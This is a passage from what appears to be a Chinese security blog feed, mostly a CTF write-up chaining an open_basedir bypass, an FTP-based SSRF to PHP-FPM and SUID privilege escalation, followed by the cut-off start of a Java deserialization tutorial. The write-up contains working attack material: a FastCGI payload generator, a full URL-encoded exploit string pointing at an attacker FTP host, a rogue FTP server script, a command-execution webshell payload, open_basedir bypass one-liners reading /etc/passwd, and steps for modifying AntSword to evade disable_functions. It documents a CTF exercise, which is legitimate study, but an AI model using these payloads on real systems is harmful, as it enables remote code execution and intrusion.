class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> $params, $stdin</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        $request = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        $paramsRequest = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= <span class="keyword">$this</span>-&gt;buildNvpair($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($paramsRequest) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, $paramsRequest);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($stdin) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, $stdin);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;?file=ftp://ip:9999/&amp;data=&#x27;</span>.urlencode($request));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">$filepath = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>; <span class="comment">// 目标主机已知的PHP文件的路径</span></span><br><span class="line">$req = <span class="string">&#x27;/&#x27;</span>.basename($filepath);</span><br><span class="line">$uri = $req .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line">$client = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">$code = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line">$php_value = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = ctf.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>; <span class="comment">// extension_dir即为.so文件所在目录</span></span><br><span class="line">$params = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; $filepath,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; $req,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; $uri,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; $req,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; $php_value,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>, <span class="comment">// 找准服务端口</span></span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen($code)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> $client-&gt;request($params, $code).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;ftp:&#x2F;&#x2F;ip:9999&#x2F;&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3C%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B0PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%2F%0Aextension+%3D+ctf.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>file_put_contents()</code> 用 <code>ftp://</code> 与我们的恶意服务器建立控制连接，使目标发送 <code>PASV</code> 命令，我们“被动”提供 ip 端口至本地 9001端口，然后建立起数据连接，将 data （fastcgi payload）的内容打到FastCGI服务</p><p>在<code>/var/www/html</code>目录下copy一个file.php文件，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;/tmp/file&#x27;</span>;</span><br><span class="line">    $data = $_GET[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span>($file.<span class="string">&quot;&lt;/br&gt;&quot;</span>.$data.<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    var_dump(file_put_contents($file, $data));</span><br><span class="line">    <span class="comment">// echo file_get_contents($file);</span></span><br></pre></td></tr></table></figure><p>也可以不这样，构造一下就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add_api.php?backdoor&#x3D;$file &#x3D; $_GET[&#39;file&#39;];$data &#x3D; $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file&#x3D;ftp:&#x2F;&#x2F;45.76.110.116:9999&#x2F;&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3C%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B0PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%2F%0Aextension+%3D+ctf.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure><ul><li>起恶意ftp服务</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9999</span>)) <span class="comment"># 监听的端口</span></span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>此时当 FTP 建立连接后，会通过被动模式将 Payload 重定向到目标主机本地 9001 端口的 PHP-FPM 上，</p><p>打一波payload，此时成功突破open_basedir，可以任意垮目录，但是任然没有读取的权限。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175949.png"></p><p>nc 没有受到反弹shell、ncat 就可以，可能是端口问题(之前用2333一直没弹，改成1234就可以了)，小问题，不影响。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175959.png"></p><h2 id="知识五-SUID-提权"><a href="#知识五-SUID-提权" class="headerlink" title="知识五(SUID 提权)"></a>知识五(SUID 提权)</h2><p><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</a></p><p>在有写权限的/var/www/html目录下，写一个</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525180008.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 1.sh</span><br><span class="line">www-data@e4f6391a3ce6:~&#x2F;html$ 1.sh -s -r report -e &#x2F;tmp&#x2F; -t</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>到这里，环境又崩了，504。不得不关了，重开。又要重新来一波操作。</p><p>发现，php可执行文件就可以suid提权，直径写php代码读flag就可以，flag是root root ，才有权限读写，因此php是可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">&#x27;css&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525180138.png"></p><p>利用流程：</p><p>FastCGI加载并调用ctfctf.so-&gt;bypass open_basedir-&gt;ftp-ssrf请求恶意ftp服务-&gt;本地php-fpm-&gt;rce</p><h2 id="知识点六-蚁剑Disable-Functions插件修改打Fastcgi-PHP-FPM"><a href="#知识点六-蚁剑Disable-Functions插件修改打Fastcgi-PHP-FPM" class="headerlink" title="知识点六(蚁剑Disable_Functions插件修改打Fastcgi/PHP-FPM)"></a>知识点六(蚁剑Disable_Functions插件修改打Fastcgi/PHP-FPM)</h2><p>蚁剑插件中，默认没有9001端口的PHP-FPM地址，蚁剑的 Payload 中用到的 fsockopen()，而 fsockopen() 被 Disable_Functions 给禁了，因此我们需要修改插件，然后梭哈。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525180021.png"></p><p>在 PHP 中除了 <code>fsockopen()</code> 这个函数外，还有一个 <code>pfsockopen()</code> 二者几乎没有什么区别，在 <code>fsockopen()</code> 被禁用后我们可以用 <code>pfsockopen()</code> 进行代替。我们可以对蚁剑的 Payload 进行修改，即将 Payload 所有的 <code>fsockopen()</code> 替换为 <code>pfsockopen()</code>。需要替换的文件有以下几个：</p><ul><li>\antData\plugins\as_bypass_php_disable_functions-master\payload.js</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525180031.png"></p><ul><li>\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js</li></ul><p>新增一行9001端口的FPM地址，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525180043.png"></p><p>重启蚁剑就可以了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525180107.png"></p><p>在之前的WebShell里写一个一句话，用蚁剑连上去。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525180056.png"></p><p>我这里试了很多次都不行，山警的几个师傅可以，我裂开了哈哈哈哈。不过学到思路就行了。(:</p><h1 id="一些总结"><a href="#一些总结" class="headerlink" title="一些总结"></a>一些总结</h1><p>利用glob协议列目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $a = <span class="string">&quot;glob:///*&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( $b = opendir($a) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( ($file = readdir($b)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.$file.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用chdir和mkdir组合列目录和读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;css&#x27;</span>);chdir(<span class="string">&#x27;css&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);var_dump(scandir(<span class="string">&quot;/&quot;</span>));<span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure><p>溢出</p><ul><li>32位元<ul><li><code>intval(&#39;1000000000000&#39;)</code> =&gt; <code>2147483647</code></li></ul></li><li>64位元<ul><li><code>intval(&#39;100000000000000000000&#39;)</code> =&gt; <code>9223372036854775807</code></li></ul></li></ul><p>ftp 主动、被动传输模式</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><a href="https://whoamianony.top/2021/05/03/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/[2021%20%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B]one_Pointer_php/">https://whoamianony.top/2021/05/03/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/[2021%20%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B]one_Pointer_php/</a></p><p><a href="https://err0r.top/article/bluehat2021/">https://err0r.top/article/bluehat2021/</a></p><p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/</a></p><p><a href="https://stackoverflow.com/questions/18286066/next-element-is-already-occupied-error">https://stackoverflow.com/questions/18286066/next-element-is-already-occupied-error</a></p><p><a href="https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/">https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/</a></p><p><a href="https://github.com/ev0A/ArbitraryFileReadList/blob/master/php_file.txt">https://github.com/ev0A/ArbitraryFileReadList/blob/master/php_file.txt</a></p><p><a href="https://xz.aliyun.com/t/6131">https://xz.aliyun.com/t/6131</a></p><p><a href="https://www.anquanke.com/post/id/186186#h3-3">https://www.anquanke.com/post/id/186186#h3-3</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很不错的一道题，值得复现一下。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化之URLDNS利用链分析学习笔记</title>
    <link href="https://hack-for.fun/65bb.html"/>
    <id>https://hack-for.fun/65bb.html</id>
    <published>2021-04-05T07:58:38.000Z</published>
    <updated>2021-05-25T10:11:31.848Z</updated>
    
    <content type="html"><![CDATA[<p>首发于阿里云先知社区，<a href="https://xz.aliyun.com/t/9417">https://xz.aliyun.com/t/9417</a></p><a id="more"></a><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><p>我们都知道一个对象只要实现了Serilizable接口，这个对象就可以被序列化，java的这种序列化模式为开发者提供了很多便利，我们可以不必关系具体序列化的过程，只要这个类实现了Serilizable接口，这个类的所有属性和方法都会自动序列化。</p><p>Java 序列化是指把 Java 对象转换为字节序列的过程</p><ul><li>ObjectOutputStream类的 writeObject() 方法可以实现序列化</li></ul><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程</p><ul><li>ObjectInputStream 类的 readObject() 方法用于反序列化。</li></ul><p>实现java.io.Serializable接口才可被反序列化，而且所有属性必须是可序列化的<br>(用<code>transient</code> 关键字修饰的属性除外，不参与序列化过程)</p><p>User.java(需要序列化的类)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java(序列化和反序列化)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;LearnJava&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] serializeData=serialize(user);</span><br><span class="line">        FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;user.bin&quot;</span>);</span><br><span class="line">        fout.write(serializeData);</span><br><span class="line">        fout.close();</span><br><span class="line">        User user2=(User) unserialize(serializeData);</span><br><span class="line">        System.out.println(user2.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看user.bin文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 